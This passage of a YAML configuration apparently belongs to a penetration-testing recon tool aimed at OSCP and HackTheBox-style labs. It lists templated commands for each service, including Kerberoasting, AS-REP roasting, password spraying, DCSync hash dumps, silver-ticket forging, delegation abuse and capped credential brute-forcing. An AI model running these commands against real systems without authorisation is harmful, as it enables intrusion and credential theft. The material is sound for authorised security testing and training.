  display_name: NFS
  match: {services: [nfs, rpcbind], ports: [111, 2049]}
  commands:
    - {id: nfs-showmount, name: NFS 내보내기 목록, description: 대상이 공개한 NFS 경로를 열람합니다., command: "showmount -e {host}", execution_mode: captured, risk: low, tool: showmount, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: nfs-export-tree, name: 내보낸 경로의 폴더·파일 트리 조회, description: 지정한 NFS export를 읽기 전용으로 임시 마운트해 전체 폴더·파일 구조를 나열한 뒤 즉시 마운트 해제합니다., command: "bash {repo_dir}/backend/scripts/nfs_tree.sh {host} {path}", execution_mode: captured, risk: medium, tool: mount.nfs, sudo: false, output: text, policy: allowed}
ldap:
  display_name: LDAP and Kerberos
  match: {services: [ldap, ldaps, kerberos-sec], ports: [88, 389, 636]}
  commands:
    - {id: ldap-rootdse, name: LDAP RootDSE 확인, description: 인증 없이 공개된 LDAP RootDSE 메타데이터를 조회합니다., command: "nmap -Pn -p{port} --script ldap-rootdse {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: ldap-anonymous-users, name: LDAP 익명 사용자 열거, description: 익명(널 세션) LDAP bind로 도메인 사용자 목록을 조회합니다. 성공하면 자격증명 없이 얻은 사용자명으로 AS-REP Roasting·패스워드 스프레이의 시작점이 됩니다., command: "nxc ldap {host} --port {port} -u '' -p '' --users", execution_mode: captured, risk: low, tool: netexec, sudo: false, output: text, policy: allowed, autorecon: true, match: {services: [ldap, ldaps], ports: [389, 636]}}
    - {id: ldap-default-audit, name: LDAP 기본 자격증명 제한 점검, description: LDAP의 별도 반복 엔진으로 사용자 8개와 비밀번호 4개를 최대 2분 동안 점검합니다. 지연·계정별 제한은 지원되지 않으며 Base DN이 필요할 수 있습니다., command: "nmap -Pn -p{port} --script ldap-brute --script-args unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [ldap, ldaps], ports: [389, 636]}}
    - {id: ldap-credential-check-netexec, name: LDAP 자격증명 확인 (NetExec), description: 사용자가 입력한 특정 계정 하나를 NetExec으로 대입해 LDAP·도메인 인증 성공 여부를 확인합니다. 대입 공격이 아니라 단일 계정 검증입니다., command: "nxc ldap {host} --port {port} -u {username} -p {password}", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ldap-dit-tree, name: "Directory Information Tree 조회", description: "LDAP은 이름 자체가 'Directory' Access Protocol입니다 -- RootDSE에서 base DN을 자동으로 찾은 뒤 그 아래 전체 디렉터리 트리를 나열합니다. username/password를 비워두면 익명 bind로 접속합니다.", command: "{repo_dir}/.venv/bin/python -m app.ldap_tree --host {host} --port {port} --username {username} --password {password}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed, match: {services: [ldap, ldaps], ports: [389, 636]}}
    - {id: ad-kerberoast-netexec, name: Kerberoasting (NetExec), description: 인증된 도메인 계정 하나로 SPN이 등록된 계정의 TGS 티켓을 요청해 크랙 가능한 해시를 수집합니다. 크래킹 자체는 별도로 직접 진행해야 합니다., command: "nxc ldap {host} -u {username} -p {password} --kerberoasting {output_dir}/kerberoast-hashes.txt", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-asreproast-impacket, name: AS-REP Roasting (Impacket), description: 자격증명 없이 사용자 목록만으로 Kerberos Pre-Auth를 요구하지 않는(UF_DONT_REQUIRE_PREAUTH) 계정의 AS-REP 해시를 수집합니다. 해당 없는 계정은 로그에만 표시되고, 실제 크랙 가능한 해시는 결과 파일에만 저장됩니다., command: "impacket-GetNPUsers {domain}/ -usersfile {wordlist} -no-pass -dc-ip {host} -outputfile {output_dir}/asrep-hashes.txt", execution_mode: captured, risk: low, tool: impacket-GetNPUsers, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-password-spray-netexec, name: 패스워드 스프레이 (NetExec), description: 발견한 사용자 목록에 비밀번호 하나를 대입해 유효한 조합을 찾습니다. OSCP 시험 방법론상 허용되는 기법이지만 계정 잠금 정책을 반드시 먼저 확인하세요., command: "nxc ldap {host} -u {wordlist} -p {password} --continue-on-success", execution_mode: captured, risk: high, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-bloodhound-collect, name: BloodHound 데이터 수집 (bloodhound-python), description: 유효한 도메인 계정으로 LDAP·SMB를 통해 사용자·그룹·세션·ACL 정보를 수집해 BloodHound GUI에서 열 수 있는 zip으로 저장합니다. 공격 경로 분석 자체는 BloodHound 앱에서 진행하세요., command: "bloodhound-python -u {username} -p {password} -d {domain} -ns {host} -c All --zip", execution_mode: captured, risk: low, tool: bloodhound-python, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-dcsync-secretsdump, name: DCSync (Impacket secretsdump), description: 유효한 도메인 계정에 디렉터리 복제 권한(DCSync)이 있는지 시도해 NTDS.dit 전체 계정 해시를 덤프합니다. 권한이 없으면 실패하며, BloodHound에서 해당 권한 경로를 먼저 확인하는 것을 권장합니다., command: "impacket-secretsdump {domain}/{username}:{password}@{host} -just-dc -outputfile {output_dir}/dcsync", execution_mode: captured, risk: medium, tool: impacket-secretsdump, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-laps-password-netexec, name: LAPS 관리자 비밀번호 조회 (NetExec), description: 컴퓨터 객체의 ms-Mcs-AdmPwd(레거시 LAPS) 또는 msLAPS-Password(Windows LAPS) 속성에 대한 읽기 권한이 있는지 확인하고, 있으면 로컬 관리자 비밀번호를 바로 조회합니다. 권한이 없으면 실패합니다., command: "nxc ldap {host} -u {username} -p {password} --laps", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-gmsa-password-netexec, name: gMSA 비밀번호 추출 (NetExec), description: 그룹 관리 서비스 계정(gMSA)의 msDS-ManagedPassword 속성에 대한 읽기 권한이 있는지 확인하고, 있으면 해당 계정의 NTLM 해시를 바로 추출합니다. 권한이 없으면 실패합니다., command: "nxc ldap {host} -u {username} -p {password} --gmsa", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-constrained-delegation-getst, name: "제한된 위임 남용 (Impacket getST.py)", description: "AllowedToDelegateTo(제한된 위임) 권한이 있는 계정으로 S4U2Self/S4U2Proxy를 사용해 원하는 사용자(보통 Administrator)를 사칭하는 서비스 티켓을 얻습니다. 계정의 비밀번호나 NTLM 해시가 필요합니다.", command: "impacket-getST -spn {spn} -impersonate {target_username} -dc-ip {host} {domain}/{username}:{password}", execution_mode: captured, risk: high, tool: impacket-getST, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-silver-ticket-ticketer, name: "Silver Ticket 위조 (Impacket ticketer.py)", description: "서비스 계정의 NTLM 해시와 도메인 SID로 원하는 그룹 권한을 가진 위조 서비스 티켓(.ccache)을 생성합니다. NTLM 해시는 예를 들어 xp_dirtree/PetitPotam 등으로 캡처한 NetNTLMv2를 크랙하거나 DCSync로 덤프해 얻을 수 있습니다. 생성된 티켓 파일은 이 실행의 작업 디렉터리에 <대상 사용자명>.ccache로 저장됩니다.", command: "impacket-ticketer -nthash {nthash} -domain-sid {domain_sid} -domain {domain} -spn {spn} -groups {groups} {target_username}", execution_mode: captured, risk: high, tool: impacket-ticketer, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
database:
  display_name: Databases
  match: {services: [ms-sql-s, mysql, postgresql, redis], ports: [1433, 3306, 5432, 6379]}
  commands:
    - {id: database-info, name: 데이터베이스 서비스 정보, description: 인증을 시도하지 않고 관찰된 데이터베이스 제품과 버전을 저장합니다., command: "nmap -Pn -sV -p{port} -oX {output_dir}/service-{port}-identity.xml {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: mysql-empty-password, name: MySQL 빈 비밀번호 확인, description: MySQL 계정의 빈 비밀번호 허용 여부를 확인합니다., command: "nmap -Pn -p{port} --script mysql-empty-password {host}", execution_mode: captured, risk: medium, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [mysql], ports: [3306]}}
    - {id: mysql-credential-probe, name: MySQL 기본 자격증명 직접 대입, description: "nmap NSE 스크립트는 소켓 타임아웃이 5초로 고정돼 있어, MySQL/MariaDB가 접속 IP의 리버스 DNS 조회(skip-name-resolve 미설정) 등으로 핸드셰이크 응답이 느려지면 빈 비밀번호를 놓칩니다. 위 사용자·비밀번호 후보를 실제 mysql 클라이언트로 하나씩 직접 대입합니다(각 시도 30초 타임아웃, 최대 40개 조합).", command: "bash {repo_dir}/backend/scripts/mysql_credential_probe.sh {host} {port} {username} {password}", execution_mode: captured, risk: medium, tool: mysql-client, sudo: false, output: text, policy: allowed, match: {services: [mysql], ports: [3306]}}
    - {id: mysql-db-tree, name: 데이터베이스·테이블 트리 조회, description: 로그인한 계정이 볼 수 있는 모든 데이터베이스와 테이블을 나열합니다. information_schema·performance_schema·mysql·sys 시스템 스키마는 제외합니다., command: "bash {repo_dir}/backend/scripts/mysql_db_tree.sh {host} {port} {username} {password}", execution_mode: captured, risk: low, tool: mysql-client, sudo: false, output: text, policy: allowed, match: {services: [mysql], ports: [3306]}}
    - {id: mysql-client, name: MySQL 수동 접속, description: "발견한 계정으로 대화형 mysql 클라이언트를 엽니다. 비밀번호는 프롬프트에서 직접 입력하세요(빈 비밀번호면 그냥 Enter). --skip-ssl을 붙여 최신 클라이언트가 TLS를 요구하다 오래된 서버(TLS 미지원)와 핸드셰이크에 실패하는 상황(ERROR 2026)을 피합니다.", command: "mysql -h {host} -P {port} -u {username} --skip-ssl -p", execution_mode: interactive, risk: low, tool: mysql-client, sudo: false, output: pty-log, policy: allowed, match: {services: [], ports: []}}
    - {id: mysql-client-mycli, name: "MySQL 수동 접속 (mycli)", description: "같은 계정으로 mycli를 엽니다. 자동 완성·문법 하이라이팅·결과 자동 정렬을 지원하는 순수 UX 보조 도구로 SQL은 직접 입력합니다(자동 공격 기능 없음). 비밀번호는 프롬프트에서 직접 입력하세요.", command: "mycli -h {host} -P {port} -u {username} -p", execution_mode: interactive, risk: low, tool: mycli, sudo: false, output: pty-log, policy: allowed, match: {services: [], ports: []}}
    - {id: postgres-default-audit, name: PostgreSQL 기본 자격증명 제한 점검, description: PostgreSQL의 순차 반복 엔진으로 사용자 8개와 비밀번호 4개를 최대 2분 동안 점검합니다. 지연·첫 성공 중단은 지원되지 않습니다., command: "nmap -Pn -p{port} --script pgsql-brute --script-args unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [postgresql], ports: [5432]}}
    - {id: postgres-db-tree, name: 데이터베이스·테이블 트리 조회, description: 로그인한 계정이 볼 수 있는 모든 데이터베이스와 테이블을 나열합니다. 데이터베이스마다 별도 연결이 필요합니다., command: "bash {repo_dir}/backend/scripts/postgres_db_tree.sh {host} {port} {username} {password}", execution_mode: captured, risk: low, tool: postgresql-client, sudo: false, output: text, policy: allowed, match: {services: [postgresql], ports: [5432]}}
    - {id: mssql-empty-password, name: MS SQL 빈 비밀번호 확인, description: SQL 계정의 빈 비밀번호 허용 여부를 확인하며 Windows 계정은 시도하지 않습니다., command: "nmap -Pn -p{port} --script ms-sql-empty-password {host}", execution_mode: captured, risk: medium, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [ms-sql-s], ports: [1433]}}
    - {id: mssql-default-audit, name: MS SQL 기본 자격증명 제한 점검, description: MS SQL의 잠금 감지 엔진으로 사용자 8개와 비밀번호 4개를 최대 2분 동안 점검합니다. Windows 계정과 잠금 무시 옵션은 사용하지 않습니다., command: "nmap -Pn -p{port} --script ms-sql-brute --script-args unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [ms-sql-s], ports: [1433]}}
    - {id: mssql-credential-check-netexec, name: MS SQL 자격증명 확인 (NetExec), description: 사용자가 입력한 특정 계정 하나를 NetExec으로 대입해 MS SQL 인증 성공 여부와 명령 실행 권한을 확인합니다. 대입 공격이 아니라 단일 계정 검증입니다., command: "nxc mssql {host} --port {port} -u {username} -p {password}", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: mssql-db-tree, name: 데이터베이스·테이블 트리 조회, description: "sp_MSforeachdb로 모든 데이터베이스와 테이블을 한 번에 나열합니다. 실제 SQL Server로 검증하지 못했습니다 -- 결과가 이상하면 impacket-mssqlclient로 직접 확인해주세요.", command: "bash {repo_dir}/backend/scripts/mssql_db_tree.sh {host} {port} {username} {password} {domain}", execution_mode: captured, risk: low, tool: impacket-mssqlclient, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: mssql-rid-brute-netexec, name: RID 순환 사용자 열거 (NetExec MSSQL), description: 유효한 MS SQL 계정(로컬 SQL 로그인도 가능) 하나로 RID를 순차 대입해 도메인 사용자·그룹을 열거합니다. SMB Null 세션과 rpcclient가 막혀 있어도 MS SQL 게스트 접근만 있으면 통하는 경우가 많습니다., command: "nxc mssql {host} --port {port} -u {username} -p {password} --rid-brute", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: mssql-client-windows-auth, name: MS SQL 수동 접속 (Windows 인증), description: "impacket-mssqlclient로 대화형 SQL 셸을 엽니다. 비밀번호는 프롬프트에서 직접 입력하세요. 도메인 계정이면 사용자 이름 입력 시 DOMAIN/username 형식으로 입력하세요(예: ARCHETYPE/sql_svc). sysadmin 여부는 SELECT IS_SRVROLEMEMBER('sysadmin')로, xp_cmdshell 활성화는 sp_configure로 셸 안에서 직접 실행합니다.", command: "impacket-mssqlclient {username}@{host} -windows-auth -port {port}", execution_mode: interactive, risk: low, tool: impacket-mssqlclient, sudo: false, output: pty-log, policy: allowed, match: {services: [ms-sql-s], ports: [1433]}}
    - {id: mssql-client-sql-auth, name: MS SQL 수동 접속 (SQL 인증), description: "impacket-mssqlclient로 대화형 SQL 셸을 엽니다. 비밀번호는 프롬프트에서 직접 입력하세요. sa 등 로컬 SQL 로그인 계정용이며 도메인 계정이면 Windows 인증 버전을 사용하세요.", command: "impacket-mssqlclient {username}@{host} -port {port}", execution_mode: interactive, risk: low, tool: impacket-mssqlclient, sudo: false, output: pty-log, policy: allowed, match: {services: [ms-sql-s], ports: [1433]}}
    - {id: redis-unauthenticated-info, name: Redis 무인증 접근 확인, description: 인증 없이 INFO 명령이 허용되는지 확인합니다., command: "nmap -Pn -p{port} --script redis-info {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [redis], ports: [6379]}}
    - {id: redis-default-audit, name: Redis 기본 비밀번호 제한 점검, description: Redis 인증에 비밀번호 4개만 최대 2분 동안 저속으로 점검합니다., command: "nmap -Pn -p{port} --script redis-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=4,brute.firstonly=true,brute.retries=0,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [redis], ports: [6379]}}
    - {id: redis-key-tree, name: 키 네임스페이스 트리 조회, description: "KEYS *로 전체 키 목록을 가져와 콜론(:)으로 구분된 네임스페이스 관례를 트리로 보여줍니다. password를 비워두면 인증 없이 접속합니다.", command: "bash {repo_dir}/backend/scripts/redis_tree.sh {host} {port} {password}", execution_mode: captured, risk: low, tool: redis-cli, sudo: false, output: text, policy: allowed, match: {services: [redis], ports: [6379]}}
    - {id: redis-client, name: Redis 수동 접속, description: "대화형 redis-cli를 엽니다. 인증이 필요하면 접속 후 AUTH <password>를 직접 입력하세요.", command: "redis-cli -h {host} -p {port}", execution_mode: interactive, risk: low, tool: redis-cli, sudo: false, output: pty-log, policy: allowed, match: {services: [], ports: []}}
rdp:
  display_name: RDP and WinRM
  match: {services: [ms-wbt-server, wsman, wsmans], ports: [3389, 5985, 5986]}
  commands:
    - {id: rdp-info, name: RDP 상세 정보 확인, description: RDP 암호화 방식과 NTLM 정보를 확인합니다., command: "nmap -Pn -p{port} --script rdp-enum-encryption,rdp-ntlm-info {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: rdp-default-audit, name: RDP 기본 계정 제한 점검, description: Nmap 기본 사용자 10개에 대해 빈 비밀번호·사용자명과 같은 비밀번호·역순 사용자명만 Hydra 2개 연결로 점검합니다. 도메인 계정은 포함하지 않습니다., command: "hydra -L /usr/share/nmap/nselib/data/usernames.lst -e nsr -t 2 -W 2 -f -s {port} rdp://{host}", execution_mode: captured, risk: high, tool: hydra, sudo: false, output: text, policy: allowed, match: {services: [ms-wbt-server], ports: [3389]}}
    - {id: rdp-credential-check-netexec, name: RDP 자격증명 확인 (NetExec), description: 사용자가 입력한 특정 계정 하나를 NetExec으로 대입해 RDP 인증 성공 여부만 확인합니다. 대입 공격이 아니라 단일 계정 검증입니다., command: "nxc rdp {host} --port {port} -u {username} -p {password}", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
snmp:
  display_name: SNMP
  match: {services: [snmp], ports: [161]}
  commands:
    - {id: snmp-info, name: SNMP 상세 정보 확인, description: 사용자가 검토한 옵션으로 Nmap SNMP 정보 스크립트를 실행합니다., command: "nmap -Pn -sU -p{port} --script snmp-info {host}", execution_mode: captured, risk: low, tool: nmap, sudo: true, output: text, policy: allowed, autorecon: true}
    - {id: snmp-onesixtyone, name: "Community 문자열 스캔 (onesixtyone)", description: 흔한 community 문자열 목록으로 무인증 접근을 빠르게 시도합니다., command: "onesixtyone {host}", execution_mode: captured, risk: low, tool: onesixtyone, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: snmp-walk-public, name: "MIB 전체 덤프 (snmpwalk, community=public)", description: 가장 흔한 기본 community 문자열 public으로 전체 MIB 트리를 덤프합니다. 실패하면 다른 community 문자열을 위 OID 트리 조회로 직접 시도하세요., command: "snmpwalk -c public -v1 {host}", execution_mode: captured, risk: low, tool: snmpwalk, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: snmp-community-audit, name: SNMP Community 문자열 제한 점검, description: Nmap 기본 Community 목록 중 12개를 최대 2분 동안 점검합니다. 지연·동시성 제한은 지원되지 않습니다., command: "nmap -Pn -sU -p{port} --script snmp-brute --script-args unpwdb.passlimit=12,unpwdb.timelimit=2m,snmp.retries=1,snmp.timeout=2s {host}", execution_mode: captured, risk: high, tool: nmap, sudo: true, output: text, policy: allowed}
    - {id: snmp-oid-tree, name: OID 트리 조회, description: "MIB 트리 전체를 한 번에 나열합니다(파일이 아니라 구조만 표시하며, 실제 값은 SNMP 상세 정보 확인으로 따로 조회하세요). password 칸에 community 문자열을 입력하세요(기본값 public).", command: "bash {repo_dir}/backend/scripts/snmp_tree.sh {host} {port} {password}", execution_mode: captured, risk: low, tool: snmp, sudo: false, output: text, policy: allowed}
mail:
  display_name: IMAP and POP3
  match: {services: [imap, imaps, pop3, pop3s], ports: [110, 143, 993, 995]}
  commands:
    - {id: imap-default-audit, name: IMAP 기본 자격증명 제한 점검, description: IMAP에 사용자 8개와 비밀번호 4개만 최대 2분 동안 저속으로 점검합니다., command: "nmap -Pn -p{port} --script imap-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=3,brute.firstonly=true,brute.retries=0,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [imap, imaps], ports: [143, 993]}}
    - {id: imap-mailbox-tree, name: 메일함 폴더 트리 조회, description: 로그인한 계정의 전체 메일함(폴더) 구조를 나열합니다., command: "{repo_dir}/.venv/bin/python -m app.imap_tree --host {host} --port {port} --username {username} --password {password}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed, match: {services: [imap, imaps], ports: [143, 993]}}
    - {id: pop3-default-audit, name: POP3 기본 자격증명 제한 점검, description: POP3에 사용자 8개와 비밀번호 4개만 최대 2분 동안 저속으로 점검합니다., command: "nmap -Pn -p{port} --script pop3-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=3,brute.firstonly=true,brute.retries=0,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [pop3, pop3s], ports: [110, 995]}}
vnc:
  display_name: VNC
  match: {services: [vnc], ports: [5900, 5901, 5902]}
  commands:
    - {id: vnc-info, name: VNC 보안 방식 확인, description: VNC 프로토콜과 지원 인증 방식을 확인합니다., command: "nmap -Pn -p{port} --script vnc-info {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: vnc-default-audit, name: VNC 기본 비밀번호 제한 점검, description: VNC에 비밀번호 4개만 최대 2분 동안 저속으로 점검합니다., command: "nmap -Pn -p{port} --script vnc-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=4,brute.firstonly=true,brute.retries=0,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed}
mongodb:
  display_name: MongoDB
  match: {services: [mongodb], ports: [27017]}
  commands:
    - {id: mongodb-info, name: MongoDB 무인증 정보 확인, description: 인증 없이 MongoDB 빌드와 서버 정보가 공개되는지 확인합니다., command: "nmap -Pn -p{port} --script mongodb-info {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: mongodb-default-audit, name: MongoDB 기본 자격증명 제한 점검, description: MongoDB에 사용자 8개와 비밀번호 4개만 최대 2분 동안 저속으로 점검합니다., command: "nmap -Pn -p{port} --script mongodb-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=3,brute.firstonly=true,brute.retries=0,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: mongodb-db-tree, name: 데이터베이스·컬렉션 트리 조회, description: 인증 없이 볼 수 있는 모든 데이터베이스와 컬렉션을 나열합니다. admin·local·config 시스템 데이터베이스는 제외합니다., command: "{repo_dir}/.venv/bin/python -m app.mongodb_tree --host {host} --port {port}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed}
    - {id: mongodb-collection-dump, name: 컬렉션 문서 덤프, description: "트리에서 찾은 컬렉션 하나의 문서 내용을 최대 20개까지 JSON으로 그대로 출력합니다(예: HTB Unified의 ace.admin에 있는 UniFi 로그인 bcrypt 해시).", command: "{repo_dir}/.venv/bin/python -m app.mongodb_collection_dump --host {host} --port {port} --path {path}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed}
    - {id: mongo-client, name: MongoDB 수동 접속, description: "대화형 mongosh를 엽니다. 인증이 필요하면 접속 후 db.auth()를 직접 입력하세요.", command: "mongosh --host {host} --port {port}", execution_mode: interactive, risk: low, tool: mongosh, sudo: false, output: pty-log, policy: allowed, match: {services: [], ports: []}}
mysql:
  display_name: MySQL/MariaDB
  match: {services: [mysql], ports: [3306]}
  commands:
    - {id: mysql-info, name: "MySQL/MariaDB 버전 확인 (mysql-info)", description: "접속 시 서버가 스스로 보내는 초기 그리팅 패킷만으로 제품·버전·인증 방식을 확인합니다. -sV의 일반 Probe는 이 서비스에서 응답 없는 Probe마다 시간을 허비해 오래 걸리므로, 이 명령을 먼저 사용하세요.", command: "nmap -Pn -p{port} --script=mysql-info {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
rsync:
  display_name: Rsync
  match: {services: [rsync], ports: [873]}
  commands:
    - {id: rsync-modules, name: Rsync 공개 모듈 확인, description: 인증 없이 노출된 Rsync 모듈 목록을 확인합니다., command: "nmap -Pn -p{port} --script rsync-list-modules {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: rsync-default-audit, name: Rsync 기본 자격증명 제한 점검, description: Rsync 인증에 사용자 8개와 비밀번호 4개만 최대 2분 동안 저속으로 점검합니다., command: "nmap -Pn -p{port} --script rsync-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=3,brute.firstonly=true,brute.retries=0,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: rsync-module-tree, name: 모듈 내 폴더·파일 트리 조회, description: 지정한 Rsync 모듈 내부 전체 폴더·파일 구조를 재귀적으로 나열합니다., command: "bash {repo_dir}/backend/scripts/rsync_tree.sh {host} {port} {path}", execution_mode: captured, risk: low, tool: rsync, sudo: false, output: text, policy: allowed}
docker:
  display_name: Docker API
  match: {services: [docker], ports: [2375, 2376]}
  commands:
    - {id: docker-api-detect, name: Docker API 인증 없이 접근 가능 여부 확인, description: "TLS 없이 노출된 Docker 데몬 API(2375/tcp)가 인증 없이 응답하는지 확인합니다. 2376/tcp(TLS 필수)는 클라이언트 인증서가 있어야 하는 게 정상이라 이 확인 대상이 아닙니다.", command: "curl -s http://{host}:{port}/version", execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed}
    - {id: docker-api-tree, name: 컨테이너·이미지 트리 조회, description: 인증 없이 볼 수 있는 모든 컨테이너와 이미지를 나열합니다., command: "{repo_dir}/.venv/bin/python -m app.docker_tree --host {host} --port {port}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed}
ike:
  display_name: IKE/IPsec
  match: {services: [isakmp], ports: [500]}
  commands:
    - {id: ike-scan-info, name: IKE 기본 정보 확인, description: 지원되는 변환 집합(transform set)과 IKE 버전을 확인합니다 (Main 모드)., command: "ike-scan {host}", execution_mode: captured, risk: low, tool: ike-scan, sudo: false, output: text, policy: allowed}
    - {id: ike-scan-aggressive-pskcrack, name: IKE Aggressive 모드 · PSK 해시 추출, description: Aggressive 모드가 활성화되어 있는지 확인하고, 활성화된 경우 hashcat -m 5400으로 대입 가능한 PSK 해시를 표준출력으로 바로 뽑아냅니다., command: "ike-scan -M -A --pskcrack=/dev/stdout {host}", execution_mode: captured, risk: medium, tool: ike-scan, sudo: false, output: text, policy: allowed}
tftp:
  display_name: TFTP
  match: {services: [tftp], ports: [69]}
  commands:
    - {id: tftp-get-file, name: TFTP 파일 다운로드, description: "파일명을 알고 있을 때(예: Cisco 라우터 설정 파일) TFTP로 받아 표준출력에 그대로 표시합니다. Type 7로 인코딩된 비밀번호가 있다면 Cisco Type 7 디코더로 바로 이어 사용할 수 있습니다.", command: "curl -s tftp://{host}/{path}", execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
unknown:
  display_name: Unknown
  match: {services: [unknown], ports: []}
  commands:
    - {id: service-version, name: 제품·버전 식별, description: "모든 Nmap 서비스 Probe로 제품과 버전을 식별하고 관찰된 값을 이 서비스에 자동 저장합니다. 일부 서비스(MySQL 등)는 -sV의 일반 Probe에 응답하지 않아 오래 걸릴 수 있어 2분으로 제한합니다 — 시간 초과 시 해당 서비스 그룹의 전용 명령을 사용하세요.", command: "nmap -Pn -sV --version-all --host-timeout 120s -p{port} -oX {output_dir}/service-{port}-identity.xml {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: service-version-udp, name: UDP 제품·버전 식별, description: "모든 Nmap UDP 서비스 Probe로 제품과 버전을 식별하고 관찰된 값을 이 서비스에 자동 저장합니다. 응답이 없는 UDP 포트는 오래 걸릴 수 있어 2분으로 제한합니다.", command: "nmap -Pn -sU -sV --version-all --host-timeout 120s -p{port} -oX {output_dir}/service-{port}-identity.xml {host}", execution_mode: captured, risk: medium, tool: nmap, sudo: true, output: text, policy: allowed}

# Data-driven Service Intelligence extensions. Each command carries its own
# matcher so adding knowledge does not require another port condition in code.
service_intelligence_extensions:
  display_name: Service Intelligence
  match: {services: [], ports: []}
  commands:
    - {id: generic-banner, name: 범용 배너 수집, description: 식별되지 않은 TCP 서비스의 배너를 안전하게 수집합니다., command: "nmap -Pn -p{port} --script banner {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [unknown, tcpwrapped], ports: []}}
    - {id: generic-tls-probe, name: TLS 여부와 인증서 확인, description: 알 수 없는 포트가 TLS를 사용하는지와 인증서·암호군을 확인합니다., command: "nmap -Pn -p{port} --script ssl-cert,ssl-enum-ciphers {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [unknown, tcpwrapped], ports: []}}
    - {id: generic-http-probe, name: HTTP 계열 여부 확인, description: 비표준 포트가 HTTP 응답을 제공하는지 제목과 헤더로 확인합니다., command: "nmap -Pn -p{port} --script http-title,http-headers {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [unknown, tcpwrapped], ports: []}}
